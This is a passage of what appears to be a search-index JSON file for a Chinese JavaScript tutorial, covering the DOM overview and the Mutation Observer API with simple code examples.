\uff08\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff09\u7b49\u5c5e\u6027\uff0c\u540c\u7ea7\u8282\u70b9\u63a5\u53e3\u5305\u62ec nextSibling \uff08\u7d27\u90bb\u5728\u540e\u7684\u90a3\u4e2a\u540c\u7ea7\u8282\u70b9\uff09\u548c previousSibling \uff08\u7d27\u90bb\u5728\u524d\u7684\u90a3\u4e2a\u540c\u7ea7\u8282\u70b9\uff09\u5c5e\u6027\u3002","title":"\u6982\u8ff0"},{"location":"dom/general/#dom","text":"","title":"DOM \u6982\u8ff0"},{"location":"dom/general/#dom_1","text":"DOM \u662f JavaScript \u64cd\u4f5c\u7f51\u9875\u7684\u63a5\u53e3\uff0c\u5168\u79f0\u4e3a\u201c\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u201d\uff08Document Object Model\uff09\u3002\u5b83\u7684\u4f5c\u7528\u662f\u5c06\u7f51\u9875\u8f6c\u4e3a\u4e00\u4e2a JavaScript \u5bf9\u8c61\uff0c\u4ece\u800c\u53ef\u4ee5\u7528\u811a\u672c\u8fdb\u884c\u5404\u79cd\u64cd\u4f5c\uff08\u6bd4\u5982\u589e\u5220\u5185\u5bb9\uff09\u3002 \u6d4f\u89c8\u5668\u4f1a\u6839\u636e DOM \u6a21\u578b\uff0c\u5c06\u7ed3\u6784\u5316\u6587\u6863\uff08\u6bd4\u5982 HTML \u548c XML\uff09\u89e3\u6790\u6210\u4e00\u7cfb\u5217\u7684\u8282\u70b9\uff0c\u518d\u7531\u8fd9\u4e9b\u8282\u70b9\u7ec4\u6210\u4e00\u4e2a\u6811\u72b6\u7ed3\u6784\uff08DOM Tree\uff09\u3002\u6240\u6709\u7684\u8282\u70b9\u548c\u6700\u7ec8\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u90fd\u6709\u89c4\u8303\u7684\u5bf9\u5916\u63a5\u53e3\u3002 DOM \u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\u89c4\u8303\uff0c\u53ef\u4ee5\u7528\u5404\u79cd\u8bed\u8a00\u5b9e\u73b0\u3002\u6240\u4ee5\u4e25\u683c\u5730\u8bf4\uff0cDOM \u4e0d\u662f JavaScript \u8bed\u6cd5\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u662f DOM \u64cd\u4f5c\u662f JavaScript \u6700\u5e38\u89c1\u7684\u4efb\u52a1\uff0c\u79bb\u5f00\u4e86 DOM\uff0cJavaScript \u5c31\u65e0\u6cd5\u63a7\u5236\u7f51\u9875\u3002\u53e6\u4e00\u65b9\u9762\uff0cJavaScript \u4e5f\u662f\u6700\u5e38\u7528\u4e8e DOM \u64cd\u4f5c\u7684\u8bed\u8a00\u3002\u540e\u9762\u4ecb\u7ecd\u7684\u5c31\u662f JavaScript \u5bf9 DOM \u6807\u51c6\u7684\u5b9e\u73b0\u548c\u7528\u6cd5\u3002","title":"DOM"},{"location":"dom/general/#_1","text":"DOM \u7684\u6700\u5c0f\u7ec4\u6210\u5355\u4f4d\u53eb\u505a\u8282\u70b9\uff08node\uff09\u3002\u6587\u6863\u7684\u6811\u5f62\u7ed3\u6784\uff08DOM \u6811\uff09\uff0c\u5c31\u662f\u7531\u5404\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u8282\u70b9\u7ec4\u6210\u3002\u6bcf\u4e2a\u8282\u70b9\u53ef\u4ee5\u770b\u4f5c\u662f\u6587\u6863\u6811\u7684\u4e00\u7247\u53f6\u5b50\u3002 \u8282\u70b9\u7684\u7c7b\u578b\u6709\u4e03\u79cd\u3002 Document \uff1a\u6574\u4e2a\u6587\u6863\u6811\u7684\u9876\u5c42\u8282\u70b9 DocumentType \uff1a doctype \u6807\u7b7e\uff08\u6bd4\u5982 <!DOCTYPE html> \uff09 Element \uff1a\u7f51\u9875\u7684\u5404\u79cdHTML\u6807\u7b7e\uff08\u6bd4\u5982 <body> \u3001 <a> \u7b49\uff09 Attr \uff1a\u7f51\u9875\u5143\u7d20\u7684\u5c5e\u6027\uff08\u6bd4\u5982 class=\"right\" \uff09 Text \uff1a\u6807\u7b7e\u4e4b\u95f4\u6216\u6807\u7b7e\u5305\u542b\u7684\u6587\u672c Comment \uff1a\u6ce8\u91ca DocumentFragment \uff1a\u6587\u6863\u7684\u7247\u6bb5 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e00\u4e2a\u539f\u751f\u7684\u8282\u70b9\u5bf9\u8c61 Node \uff0c\u4e0a\u9762\u8fd9\u4e03\u79cd\u8282\u70b9\u90fd\u7ee7\u627f\u4e86 Node \uff0c\u56e0\u6b64\u5177\u6709\u4e00\u4e9b\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002","title":"\u8282\u70b9"},{"location":"dom/general/#_2","text":"\u4e00\u4e2a\u6587\u6863\u7684\u6240\u6709\u8282\u70b9\uff0c\u6309\u7167\u6240\u5728\u7684\u5c42\u7ea7\uff0c\u53ef\u4ee5\u62bd\u8c61\u6210\u4e00\u79cd\u6811\u72b6\u7ed3\u6784\u3002\u8fd9\u79cd\u6811\u72b6\u7ed3\u6784\u5c31\u662f DOM \u6811\u3002\u5b83\u6709\u4e00\u4e2a\u9876\u5c42\u8282\u70b9\uff0c\u4e0b\u4e00\u5c42\u90fd\u662f\u9876\u5c42\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c\u7136\u540e\u5b50\u8282\u70b9\u53c8\u6709\u81ea\u5df1\u7684\u5b50\u8282\u70b9\uff0c\u5c31\u8fd9\u6837\u5c42\u5c42\u884d\u751f\u51fa\u4e00\u4e2a\u91d1\u5b57\u5854\u7ed3\u6784\uff0c\u53c8\u50cf\u4e00\u68f5\u6811\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b document \u8282\u70b9\uff0c\u4ee3\u8868\u6574\u4e2a\u6587\u6863\u3002 1 2 document // \u6574\u4e2a\u6587\u6863\u6811 \u6587\u6863\u7684\u7b2c\u4e00\u5c42\u6709\u4e24\u4e2a\u8282\u70b9\uff0c\u7b2c\u4e00\u4e2a\u662f\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08 <!doctype html> \uff09\uff0c\u7b2c\u4e8c\u4e2a\u662f HTML \u7f51\u9875\u7684\u9876\u5c42\u5bb9\u5668\u6807\u7b7e <html> \u3002\u540e\u8005\u6784\u6210\u4e86\u6811\u7ed3\u6784\u7684\u6839\u8282\u70b9\uff08root node\uff09\uff0c\u5176\u4ed6 HTML \u6807\u7b7e\u8282\u70b9\u90fd\u662f\u5b83\u7684\u4e0b\u7ea7\u8282\u70b9\u3002 \u9664\u4e86\u6839\u8282\u70b9\uff0c\u5176\u4ed6\u8282\u70b9\u90fd\u6709\u4e09\u79cd\u5c42\u7ea7\u5173\u7cfb\u3002 \u7236\u8282\u70b9\u5173\u7cfb\uff08parentNode\uff09\uff1a\u76f4\u63a5\u7684\u90a3\u4e2a\u4e0a\u7ea7\u8282\u70b9 \u5b50\u8282\u70b9\u5173\u7cfb\uff08childNodes\uff09\uff1a\u76f4\u63a5\u7684\u4e0b\u7ea7\u8282\u70b9 \u540c\u7ea7\u8282\u70b9\u5173\u7cfb\uff08sibling\uff09\uff1a\u62e5\u6709\u540c\u4e00\u4e2a\u7236\u8282\u70b9\u7684\u8282\u70b9 DOM \u63d0\u4f9b\u64cd\u4f5c\u63a5\u53e3\uff0c\u7528\u6765\u83b7\u53d6\u8fd9\u4e09\u79cd\u5173\u7cfb\u7684\u8282\u70b9\u3002\u6bd4\u5982\uff0c\u5b50\u8282\u70b9\u63a5\u53e3\u5305\u62ec firstChild \uff08\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\uff09\u548c lastChild \uff08\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff09\u7b49\u5c5e\u6027\uff0c\u540c\u7ea7\u8282\u70b9\u63a5\u53e3\u5305\u62ec nextSibling \uff08\u7d27\u90bb\u5728\u540e\u7684\u90a3\u4e2a\u540c\u7ea7\u8282\u70b9\uff09\u548c previousSibling \uff08\u7d27\u90bb\u5728\u524d\u7684\u90a3\u4e2a\u540c\u7ea7\u8282\u70b9\uff09\u5c5e\u6027\u3002","title":"\u8282\u70b9\u6811"},{"location":"dom/mutationobserver/","text":"Mutation Observer API \u00b6 \u6982\u8ff0 \u00b6 Mutation Observer API \u7528\u6765\u76d1\u89c6 DOM \u53d8\u52a8\u3002DOM \u7684\u4efb\u4f55\u53d8\u52a8\uff0c\u6bd4\u5982\u8282\u70b9\u7684\u589e\u51cf\u3001\u5c5e\u6027\u7684\u53d8\u52a8\u3001\u6587\u672c\u5185\u5bb9\u7684\u53d8\u52a8\uff0c\u8fd9\u4e2a API \u90fd\u53ef\u4ee5\u5f97\u5230\u901a\u77e5\u3002 \u6982\u5ff5\u4e0a\uff0c\u5b83\u5f88\u63a5\u8fd1\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a DOM \u53d1\u751f\u53d8\u52a8\u5c31\u4f1a\u89e6\u53d1 Mutation Observer \u4e8b\u4ef6\u3002\u4f46\u662f\uff0c\u5b83\u4e0e\u4e8b\u4ef6\u6709\u4e00\u4e2a\u672c\u8d28\u4e0d\u540c\uff1a\u4e8b\u4ef6\u662f\u540c\u6b65\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cDOM \u7684\u53d8\u52a8\u7acb\u523b\u4f1a\u89e6\u53d1\u76f8\u5e94\u7684\u4e8b\u4ef6\uff1bMutation Observer \u5219\u662f\u5f02\u6b65\u89e6\u53d1\uff0cDOM \u7684\u53d8\u52a8\u5e76\u4e0d\u4f1a\u9a6c\u4e0a\u89e6\u53d1\uff0c\u800c\u662f\u8981\u7b49\u5230\u5f53\u524d\u6240\u6709 DOM \u64cd\u4f5c\u90fd\u7ed3\u675f\u624d\u89e6\u53d1\u3002 \u8fd9\u6837\u8bbe\u8ba1\u662f\u4e3a\u4e86\u5e94\u4ed8 DOM \u53d8\u52a8\u9891\u7e41\u7684\u7279\u70b9\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u6587\u6863\u4e2d\u8fde\u7eed\u63d2\u51651000\u4e2a <p> \u5143\u7d20\uff0c\u5c31\u4f1a\u8fde\u7eed\u89e6\u53d11000\u4e2a\u63d2\u5165\u4e8b\u4ef6\uff0c\u6267\u884c\u6bcf\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\uff0c\u8fd9\u5f88\u53ef\u80fd\u9020\u6210\u6d4f\u89c8\u5668\u7684\u5361\u987f\uff1b\u800c Mutation Observer \u5b8c\u5168\u4e0d\u540c\uff0c\u53ea\u57281000\u4e2a\u6bb5\u843d\u90fd\u63d2\u5165\u7ed3\u675f\u540e\u624d\u4f1a\u89e6\u53d1\uff0c\u800c\u4e14\u53ea\u89e6\u53d1\u4e00\u6b21\u3002 Mutation Observer \u6709\u4ee5\u4e0b\u7279\u70b9\u3002 \u5b83\u7b49\u5f85\u6240\u6709\u811a\u672c\u4efb\u52a1\u5b8c\u6210\u540e\uff0c\u624d\u4f1a\u8fd0\u884c\uff08\u5373\u5f02\u6b65\u89e6\u53d1\u65b9\u5f0f\uff09\u3002 \u5b83\u628a DOM \u53d8\u52a8\u8bb0\u5f55\u5c01\u88c5\u6210\u4e00\u4e2a\u6570\u7ec4\u8fdb\u884c\u5904\u7406\uff0c\u800c\u4e0d\u662f\u4e00\u6761\u6761\u4e2a\u522b\u5904\u7406 DOM \u53d8\u52a8\u3002 \u5b83\u65e2\u53ef\u4ee5\u89c2\u5bdf DOM \u7684\u6240\u6709\u7c7b\u578b\u53d8\u52a8\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u53ea\u89c2\u5bdf\u67d0\u4e00\u7c7b\u53d8\u52a8\u3002 MutationObserver \u6784\u9020\u51fd\u6570 \u00b6 \u4f7f\u7528\u65f6\uff0c\u9996\u5148\u4f7f\u7528 MutationObserver \u6784\u9020\u51fd\u6570\uff0c\u65b0\u5efa\u4e00\u4e2a\u89c2\u5bdf\u5668\u5b9e\u4f8b\uff0c\u540c\u65f6\u6307\u5b9a\u8fd9\u4e2a\u5b9e\u4f8b\u7684\u56de\u8c03\u51fd\u6570\u3002 1 var observer = new MutationObserver ( callback ); \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u56de\u8c03\u51fd\u6570\uff0c\u4f1a\u5728\u6bcf\u6b21 DOM \u53d8\u52a8\u540e\u8c03\u7528\u3002\u8be5\u56de\u8c03\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u53d8\u52a8\u6570\u7ec4\uff0c\u7b2c\u4e8c\u4e2a\u662f\u89c2\u5bdf\u5668\u5b9e\u4f8b\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var observer = new MutationObserver ( function ( mutations , observer ) { mutations . forEach ( function ( mutation ) { console . log ( mutation ); }); }); MutationObserver \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 observe() \u00b6 observe() \u65b9\u6cd5\u7528\u6765\u542f\u52a8\u76d1\u542c\uff0c\u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u6240\u8981\u89c2\u5bdf\u7684 DOM \u8282\u70b9 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u6307\u5b9a\u6240\u8981\u89c2\u5bdf\u7684\u7279\u5b9a\u53d8\u52a8 1 2 3 4 5 6 7 8 var article = document . querySelector ( 'article' ); var options = { 'childList' : true , 'attributes' : true } ; observer . observe ( article , options ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c observe() \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u6240\u8981\u89c2\u5bdf\u7684DOM\u5143\u7d20\u662f article \uff0c\u7b2c\u4e8c\u4e2a\u662f\u6240\u8981\u89c2\u5bdf\u7684\u53d8\u52a8\u7c7b\u578b\uff08\u5b50\u8282\u70b9\u53d8\u52a8\u548c\u5c5e\u6027\u53d8\u52a8\uff09\u3002 \u89c2\u5bdf\u5668\u6240\u80fd\u89c2\u5bdf\u7684 DOM \u53d8\u52a8\u7c7b\u578b\uff08\u5373\u4e0a\u9762\u4ee3\u7801\u7684 options \u5bf9\u8c61\uff09\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002 childList \uff1a\u5b50\u8282\u70b9\u7684\u53d8\u52a8\uff08\u6307\u65b0\u589e\uff0c\u5220\u9664\u6216\u8005\u66f4\u6539\uff09\u3002 attributes \uff1a\u5c5e\u6027\u7684\u53d8\u52a8\u3002 characterData \uff1a\u8282\u70b9\u5185\u5bb9\u6216\u8282\u70b9\u6587\u672c\u7684\u53d8\u52a8\u3002 \u60f3\u8981\u89c2\u5bdf\u54ea\u4e00\u79cd\u53d8\u52a8\u7c7b\u578b\uff0c\u5c31\u5728 option \u5bf9\u8c61\u4e2d\u6307\u5b9a\u5b83\u7684\u503c\u4e3a true \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u81f3\u5c11\u5fc5\u987b\u540c\u65f6\u6307\u5b9a\u8fd9\u4e09\u79cd\u89c2\u5bdf\u7684\u4e00\u79cd\uff0c\u82e5\u5747\u672a\u6307\u5b9a\u5c06\u62a5\u9519\u3002 \u9664\u4e86\u53d8\u52a8\u7c7b\u578b\uff0c options \u5bf9\u8c61\u8fd8\u53ef\u4ee5\u8bbe\u5b9a\u4ee5\u4e0b\u5c5e\u6027\uff1a subtree \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5c06\u8be5\u89c2\u5bdf\u5668\u5e94\u7528\u4e8e\u8be5\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002 attributeOldValue \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89c2\u5bdf attributes \u53d8\u52a8\u65f6\uff0c\u662f\u5426\u9700\u8981\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u5c5e\u6027\u503c\u3002 characterDataOldValue \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89c2\u5bdf characterData \u53d8\u52a8\u65f6\uff0c\u662f\u5426\u9700\u8981\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u503c\u3002 attributeFilter \uff1a\u6570\u7ec4\uff0c\u8868\u793a\u9700\u8981\u89c2\u5bdf\u7684\u7279\u5b9a\u5c5e\u6027\uff08\u6bd4\u5982 ['class','src'] \uff09\u3002 1 2 3 4 5 6 7 8 9 // \u5f00\u59cb\u76d1\u542c\u6587\u6863\u6839\u8282\u70b9\uff08\u5373<html>\u6807\u7b7e\uff09\u7684\u53d8\u52a8 mutationObserver . observe ( document . documentElement , { attributes : true , characterData : true , childList : true , subtree : true , attributeOldValue : true , characterDataOldValue : true }); \u5bf9\u4e00\u4e2a\u8282\u70b9\u6dfb\u52a0\u89c2\u5bdf\u5668\uff0c\u5c31\u50cf\u4f7f\u7528 addEventListener() \u65b9\u6cd5\u4e00\u6837\uff0c\u591a\u6b21\u6dfb\u52a0\u540c\u4e00\u4e2a\u89c2\u5bdf\u5668\u662f\u65e0\u6548\u7684\uff0c\u56de\u8c03\u51fd\u6570\u4f9d\u7136\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21\u3002\u5982\u679c\u6307\u5b9a\u4e0d\u540c\u7684 options \u5bf9\u8c61\uff0c\u4ee5\u540e\u9762\u6dfb\u52a0\u7684\u90a3\u4e2a\u4e3a\u51c6\uff0c\u7c7b\u4f3c\u8986\u76d6\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u89c2\u5bdf\u65b0\u589e\u7684\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 var insertedNodes = []; var observer = new MutationObserver ( function ( mutations ) { mutations . forEach ( function ( mutation ) { for ( var i = 0 ; i < mutation . addedNodes . length ; i ++ ) { insertedNodes . push ( mutation . addedNodes [ i ]); } }); console . log ( insertedNodes ); }); observer . observe ( document , { childList : true , subtree : true }); disconnect()\uff0ctakeRecords() \u00b6 disconnect() \u65b9\u6cd5\u7528\u6765\u505c\u6b62\u89c2\u5bdf\u3002\u8c03\u7528\u8be5\u65b9\u6cd5\u540e\uff0cDOM \u518d\u53d1\u751f\u53d8\u52a8\uff0c\u4e5f\u4e0d\u4f1a\u89e6\u53d1\u89c2\u5bdf\u5668\u3002 1 observer . disconnect (); takeRecords() \u65b9\u6cd5\u7528\u6765\u6e05\u9664\u53d8\u52a8\u8bb0\u5f55\uff0c\u5373\u4e0d\u518d\u5904\u7406\u672a\u5904\u7406\u7684\u53d8\u52a8\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u53d8\u52a8\u8bb0\u5f55\u7684\u6570\u7ec4\u3002 1 observer . takeRecords (); \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 // \u4fdd\u5b58\u6240\u6709\u6ca1\u6709\u88ab\u89c2\u5bdf\u5668\u5904\u7406\u7684\u53d8\u52a8 var changes = mutationObserver . takeRecords (); // \u505c\u6b62\u89c2\u5bdf mutationObserver . disconnect (); MutationRecord \u5bf9\u8c61 \u00b6 DOM \u6bcf\u6b21\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u6761\u53d8\u52a8\u8bb0\u5f55\uff08MutationRecord \u5b9e\u4f8b\uff09\u3002\u8be5\u5b9e\u4f8b\u5305\u542b\u4e86\u4e0e\u53d8\u52a8\u76f8\u5173\u7684\u6240\u6709\u4fe1\u606f\u3002Mutation Observer \u5904\u7406\u7684\u5c31\u662f\u4e00\u4e2a\u4e2a MutationRecord \u5b9e\u4f8b\u6240\u7ec4\u6210\u7684\u6570\u7ec4\u3002 MutationRecord \u5bf9\u8c61\u5305\u542b\u4e86DOM\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6709\u5982\u4e0b\u5c5e\u6027\uff1a type \uff1a\u89c2\u5bdf\u7684\u53d8\u52a8\u7c7b\u578b\uff08 attributes \u3001 characterData \u6216\u8005 childList \uff09\u3002 target \uff1a\u53d1\u751f\u53d8\u52a8\u7684DOM\u8282\u70b9\u3002 addedNodes \uff1a\u65b0\u589e\u7684DOM\u8282\u70b9\u3002 removedNodes \uff1a\u5220\u9664\u7684DOM\u8282\u70b9\u3002 previousSibling \uff1a\u524d\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 nextSibling \uff1a\u4e0b\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 attributeName \uff1a\u53d1\u751f\u53d8\u52a8\u7684\u5c5e\u6027\u3002\u5982\u679c\u8bbe\u7f6e\u4e86 attributeFilter \uff0c\u5219\u53ea\u8fd4\u56de\u9884\u5148\u6307\u5b9a\u7684\u5c5e\u6027\u3002 oldValue \uff1a\u53d8\u52a8\u524d\u7684\u503c\u3002\u8fd9\u4e2a\u5c5e\u6027\u53ea\u5bf9 attribute \u548c characterData \u53d8\u52a8\u6709\u6548\uff0c\u5982\u679c\u53d1\u751f childList \u53d8\u52a8\uff0c\u5219\u8fd4\u56de null \u3002 \u5e94\u7528\u793a\u4f8b \u00b6 \u5b50\u5143\u7d20\u7684\u53d8\u52a8 \u00b6 \u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\u5982\u4f55\u8bfb\u53d6\u53d8\u52a8\u8bb0\u5f55\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var callback = function ( records ){ records . map ( function ( record ){ console . log ( 'Mutation type: ' + record . type ); console . log ( 'Mutation target: ' + record . target ); }); }; var mo = new MutationObserver ( callback ); var option = { 'childList' : true , 'subtree' : true }; mo . observe ( document . body , option ); \u4e0a\u9762\u4ee3\u7801\u7684\u89c2\u5bdf\u5668\uff0c\u89c2\u5bdf <body> \u7684\u6240\u6709\u4e0b\u7ea7\u8282\u70b9\uff08 childList \u8868\u793a\u89c2\u5bdf\u5b50\u8282\u70b9\uff0c subtree \u8868\u793a\u89c2\u5bdf\u540e\u4ee3\u8282\u70b9\uff09\u7684\u53d8\u52a8\u3002\u56de\u8c03\u51fd\u6570\u4f1a\u5728\u63a7\u5236\u53f0\u663e\u793a\u6240\u6709\u53d8\u52a8\u7684\u7c7b\u578b\u548c\u76ee\u6807\u8282\u70b9\u3002 \u5c5e\u6027\u7684\u53d8\u52a8 \u00b6 \u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\u5982\u4f55\u8ffd\u8e2a\u5c5e\u6027\u7684\u53d8\u52a8\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var callback = function ( records ) { records . map ( function ( record ) { console . log ( 'Previous attribute value: ' + record . oldValue ); }); }; var mo = new MutationObserver ( callback ); var element = document . getElementById ( '#my_element' ); var options = { 'attributes' : true , 'attributeOldValue' : true } mo . observe ( element , options ); \u4e0a\u9762\u4ee3\u7801\u5148\u8bbe\u5b9a\u8ffd\u8e2a\u5c5e\u6027\u53d8\u52a8\uff08 'attributes': true \uff09\uff0c\u7136\u540e\u8bbe\u5b9a\u8bb0\u5f55\u53d8\u52a8\u524d\u7684\u503c\u3002\u5b9e\u9645\u53d1\u751f\u53d8\u52a8\u65f6\uff0c\u4f1a\u5c06\u53d8\u52a8\u524d\u7684\u503c\u663e\u793a\u5728\u63a7\u5236\u53f0\u3002 \u53d6\u4ee3 DOMContentLoaded \u4e8b\u4ef6 \u00b6 \u7f51\u9875\u52a0\u8f7d\u7684\u65f6\u5019\uff0cDOM \u8282\u70b9\u7684\u751f\u6210\u4f1a\u4ea7\u751f\u53d8\u52a8\u8bb0\u5f55\uff0c\u56e0\u6b64\u53ea\u8981\u89c2\u5bdf DOM \u7684\u53d8\u52a8\uff0c\u5c31\u80fd\u5728\u7b2c\u4e00\u65f6\u95f4\u89e6\u53d1\u76f8\u5173\u4e8b\u4ef6\uff0c\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u4f7f\u7528 DOMContentLoaded \u4e8b\u4ef6\u3002 1 2 3 4 5 var observer = new MutationObserver ( callback ); observer . observe ( document . documentElement , { childList : true , subtree : true }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u76d1\u542c document.documentElement \uff08\u5373\u7f51\u9875\u7684 <html> HTML \u8282\u70b9\uff09\u7684\u5b50\u8282\u70b9\u7684\u53d8\u52a8\uff0c subtree \u5c5e\u6027\u6307\u5b9a\u76d1\u542c\u8fd8\u5305\u62ec\u540e\u4ee3\u8282\u70b9\u3002\u56e0\u6b64\uff0c\u4efb\u610f\u4e00\u4e2a\u7f51\u9875\u5143\u7d20\u4e00\u65e6\u751f\u6210\uff0c\u5c31\u80fd\u7acb\u523b\u88ab\u76d1\u542c\u5230\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4f7f\u7528 MutationObserver \u5bf9\u8c61\u5c01\u88c5\u4e00\u4e2a\u76d1\u542c DOM \u751f\u6210\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 ( function ( win ){ 'use strict' ; var listeners = []; var doc = win . document ; var MutationObserver = win . MutationObserver || win . WebKitMutationObserver ; var observer ; function ready ( selector , fn ){ // \u50a8\u5b58\u9009\u62e9\u5668\u548c\u56de\u8c03\u51fd\u6570 listeners . push ({ selector : selector , fn : fn }); if ( ! observer ){ // \u76d1\u542cdocument\u53d8\u5316 observer = new MutationObserver ( check ); observer . observe ( doc . documentElement , { childList : true , subtree : true }); } // \u68c0\u67e5\u8be5\u8282\u70b9\u662f\u5426\u5df2\u7ecf\u5728DOM\u4e2d check (); } function check (){ // \u68c0\u67e5\u662f\u5426\u5339\u914d\u5df2\u50a8\u5b58\u7684\u8282\u70b9 for ( var i = 0 ; i < listeners . length ; i ++ ){ var listener = listeners [ i ]; // \u68c0\u67e5\u6307\u5b9a\u8282\u70b9\u662f\u5426\u6709\u5339\u914d var elements = doc . querySelectorAll ( listener . selector ); for ( var j = 0 ; j < elements . length ; j ++ ){ var element = elements [ j ]; // \u786e\u4fdd\u56de\u8c03\u51fd\u6570\u53ea\u4f1a\u5bf9\u8be5\u5143\u7d20\u8c03\u7528\u4e00\u6b21 if ( ! element . ready ){ element . ready = true ; // \u5bf9\u8be5\u8282\u70b9\u8c03\u7528\u56de\u8c03\u51fd\u6570 listener . fn . call ( element , element ); } } } } // \u5bf9\u5916\u66b4\u9732ready win . ready = ready ; })( this ); // \u4f7f\u7528\u65b9\u6cd5 ready ( '.foo' , function ( element ){ // ... }); \u53c2\u8003\u94fe\u63a5 \u00b6 Paul Kinlan, Detect DOM changes with Mutation Observers Tiffany Brown, Getting to know mutation observers Michal Budzynski, JavaScript: The less known parts. DOM Mutations Jeff Griffiths, DOM MutationObserver \u2013 reacting to DOM changes without killing browser performance Addy Osmani, Detect, Undo And Redo DOM Changes With Mutation Observers Ryan Morr, Using Mutation Observers to Watch for Element Availability","title":"Mutation Observer API"},{"location":"dom/mutationobserver/#mutation-observer-api","text":"","title":"Mutation Observer API"},{"location":"dom/mutationobserver/#_1","text":"Mutation Observer API \u7528\u6765\u76d1\u89c6 DOM \u53d8\u52a8\u3002DOM \u7684\u4efb\u4f55\u53d8\u52a8\uff0c\u6bd4\u5982\u8282\u70b9\u7684\u589e\u51cf\u3001\u5c5e\u6027\u7684\u53d8\u52a8\u3001\u6587\u672c\u5185\u5bb9\u7684\u53d8\u52a8\uff0c\u8fd9\u4e2a API \u90fd\u53ef\u4ee5\u5f97\u5230\u901a\u77e5\u3002 \u6982\u5ff5\u4e0a\uff0c\u5b83\u5f88\u63a5\u8fd1\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a DOM \u53d1\u751f\u53d8\u52a8\u5c31\u4f1a\u89e6\u53d1 Mutation Observer \u4e8b\u4ef6\u3002\u4f46\u662f\uff0c\u5b83\u4e0e\u4e8b\u4ef6\u6709\u4e00\u4e2a\u672c\u8d28\u4e0d\u540c\uff1a\u4e8b\u4ef6\u662f\u540c\u6b65\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cDOM \u7684\u53d8\u52a8\u7acb\u523b\u4f1a\u89e6\u53d1\u76f8\u5e94\u7684\u4e8b\u4ef6\uff1bMutation Observer \u5219\u662f\u5f02\u6b65\u89e6\u53d1\uff0cDOM \u7684\u53d8\u52a8\u5e76\u4e0d\u4f1a\u9a6c\u4e0a\u89e6\u53d1\uff0c\u800c\u662f\u8981\u7b49\u5230\u5f53\u524d\u6240\u6709 DOM \u64cd\u4f5c\u90fd\u7ed3\u675f\u624d\u89e6\u53d1\u3002 \u8fd9\u6837\u8bbe\u8ba1\u662f\u4e3a\u4e86\u5e94\u4ed8 DOM \u53d8\u52a8\u9891\u7e41\u7684\u7279\u70b9\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u6587\u6863\u4e2d\u8fde\u7eed\u63d2\u51651000\u4e2a <p> 